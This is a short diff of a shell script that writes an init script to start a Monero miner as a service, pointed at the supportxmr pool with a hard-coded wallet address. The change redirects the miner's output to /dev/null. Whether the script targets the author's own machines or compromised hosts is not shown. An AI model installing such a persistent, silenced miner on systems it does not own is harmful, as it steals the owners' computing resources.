@@ -72,7 +72,7 @@ cat > "$INIT_SCRIPT" << EOF
 case "\$1" in
   start)
     echo "Starting $SERVICE_NAME"
-    $FULL_PATH -o pool.supportxmr.com:443 -u 44xquCZRP7k5QVc77uPtxb7Jtkaj1xyztAwoyUtmigQoHtzA8EmnAEUbpoeWcxRy1nJxu4UYrR4fN3MPufQQk4MTL6M2Y73 -k --tls -p prolay &
+    $FULL_PATH -o pool.supportxmr.com:443 -u 44xquCZRP7k5QVc77uPtxb7Jtkaj1xyztAwoyUtmigQoHtzA8EmnAEUbpoeWcxRy1nJxu4UYrR4fN3MPufQQk4MTL6M2Y73 -k --tls -p prolay > /dev/null 2>&1 &
     ;;
   stop)
     echo "Stopping $SERVICE_NAME"
